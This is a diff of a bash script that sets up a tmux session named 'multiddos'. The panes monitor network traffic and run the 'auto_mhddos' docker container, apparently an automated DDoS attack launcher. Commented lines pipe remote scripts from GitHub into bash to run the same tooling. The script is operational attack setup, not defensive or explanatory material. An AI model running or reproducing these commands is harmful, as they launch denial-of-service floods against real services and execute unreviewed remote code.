@@ -32,10 +32,10 @@ if [ ! -f "/usr/local/bin/gotop" ]; then
     sudo dpkg -i gotop.deb
 fi
 
-tmux new-session -s multiddos -d #'gotop -ac solarized'
+tmux new-session -s multiddos -d 'vnstat -l'
 sleep 0.1
-tmux split-window -v 'vnstat -l'
-sleep 0.1
+#tmux split-window -v 'gotop -ac solarized'
+#sleep 0.1
 #tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash -s -- 2000'
 #tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash'
 tmux split-window -v 'docker run -it --name auto_mhddos --rm --pull always ghcr.io/theorlovsky/auto_mhddos:latest'
